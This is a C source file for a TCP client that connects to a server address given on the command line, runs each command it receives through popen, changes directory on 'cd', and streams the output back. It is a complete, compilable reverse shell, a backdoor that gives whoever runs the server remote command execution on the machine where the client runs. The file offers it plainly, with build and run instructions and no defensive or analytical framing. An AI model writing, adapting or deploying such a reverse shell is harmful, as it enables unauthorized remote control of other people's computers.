//compile using g++ client.c -o client
//run with: ./client IP port

#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

#define BUFFER_SIZE 1024  // Define the buffer size for data transfer

// Function to execute shell commands received from the server
void ExecuteShell(const char* serverIp, int serverPort) {
    int clientSock;
    struct sockaddr_in serverAddr;
    clientSock = socket(AF_INET, SOCK_STREAM, 0);  // Create a socket
    if (clientSock == -1) {
        perror("Error creating socket");
        exit(1);
    }

    serverAddr.sin_family = AF_INET;  // Set the server address family
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);  // Set the server IP address
    serverAddr.sin_port = htons(serverPort);  // Set the server port

    // Connect to the server
    if (connect(clientSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("Error connecting to the server");
        close(clientSock);
        exit(1);
    }
    else {
        printf("Connected to the server.\n");
    }

    // Loop to receive and execute commands from the server
    while(1) {
        sleep(5);

        char receivedData[BUFFER_SIZE]; // Buffer to store received data
        memset(receivedData, 0, sizeof(receivedData));  // Clear the received data buffer
        int receivedCode = recv(clientSock, receivedData, BUFFER_SIZE, 0);  // Receive data from the server

        if (receivedCode <= 0) {
            perror("Error receiving data from the server");
            close(clientSock);
            exit(1);
        }

        else {
            printf("Received message from the server: %s\n", receivedData);

            // If the received message is "exit", close the connection and exit
            if (strcmp(receivedData, "exit") == 0) {
                printf("Exit message received. Closing connection.\n");
                break;
            }
            // If the received message starts with "cd ", change the current directory
            if (strncmp(receivedData, "cd ", 3) == 0) {
                if (chdir(receivedData + 3) < 0) {
                    perror("Error changing directory");
                }else {
                char successMsg[] = "success";
                send(clientSock, successMsg, strlen(successMsg), 0);  // Send success message to the server
                usleep(1000);
                char endMsg[] = "EOM";
                send(clientSock, endMsg, strlen(endMsg), 0);  // Send an "End Of Message" signal to the server
            }
            continue;
        }
                    // Execute the received command and send the output back to the server
            FILE* commandOutput = popen(receivedData, "r");
            if (commandOutput == NULL) {
                perror("Error executing shell command");
                close(clientSock);
                exit(1);
            }

            char buffer[BUFFER_SIZE];
            while (fgets(buffer, BUFFER_SIZE, commandOutput) != NULL) {
                printf("%s", buffer);
                send(clientSock, buffer, strlen(buffer), 0);  // Send the command output to the server
            }
            usleep(1000);
            char endMsg[] = "EOM";
            send(clientSock, endMsg, strlen(endMsg), 0);  // Send an "End Of Message" signal to the server

            pclose(commandOutput);  // Close the command output stream
        }
    }
    close(clientSock);  // Close the socket
}

// Function to handle user input and send it to the server
void* HandleUserInput(void* arg) {
    int clientSock = *(int*)arg;
    char buffer[BUFFER_SIZE];
    while (1) {
        fgets(buffer, sizeof(buffer), stdin);  // Get user input
        strtok(buffer, "\n");  // Remove the newline character from the input

        // If the user input is "exit", close the connection and exit
        if (strcmp(buffer, "exit") == 0) {
            printf("Exit command received. Closing connection.\n");
            close(clientSock);
            exit(0);
        }

        // Send the user input to the server
        if (write(clientSock, buffer, strlen(buffer)) < 0) {
            perror("Error sending command to server");
            close(clientSock);
            exit(1);
        }
    }
    return NULL;
}

// Main function
int main(int argc, char **argv) {
    // If the server IP and port are provided as command line arguments, use them
    if (argc == 3) {
        int port  = atoi(argv[2]);
        ExecuteShell(argv[1], port);
    }
    // Otherwise, use the default server IP and port
    else {
        const char defaultHost[] = "127.0.0.1";
        int defaultPort = 45043;
        ExecuteShell(defaultHost, defaultPort);
    }
    return 0;
}